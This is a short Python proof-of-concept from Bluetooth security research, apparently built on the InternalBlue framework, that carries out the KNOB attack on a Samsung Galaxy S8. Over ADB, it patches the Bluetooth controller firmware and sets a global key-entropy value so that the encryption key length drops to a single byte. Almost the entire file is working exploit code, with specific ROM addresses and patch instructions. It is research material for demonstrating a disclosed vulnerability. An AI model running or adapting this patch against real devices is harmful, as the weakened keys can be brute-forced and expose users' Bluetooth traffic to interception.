#!/usr/bin/python3

# Jiska Classen, Secure Mobile Networking Lab
from internalblue import Address
from internalblue.adbcore import ADBCore
from internalblue.utils.pwnlib_wrapper import log, asm


"""
This is a standalone PoC for the KNOB attack on a Samsung Galaxy S8.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.

"""


internalblue = ADBCore(serial=True)
internalblue.interface = internalblue.device_list()[0][1] # just use the first device

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)


log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req is always len=1!")

# modify function lm_SendLmpEncryptKeySizeReq
patch = asm("mov r2, #0x1", vma=0x530F6)  # connection struct key entropy
internalblue.patchRom(Address(0x530F6), patch)

# modify global variable for own setting
internalblue.writeMem(0x255E8F, b'\x01')  # global key entropy


internalblue.shutdown()
exit(-1)
log.info("-----------------------\n"
         "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
         "Currently, there is no LMP monitoring option on Android 8.\n")


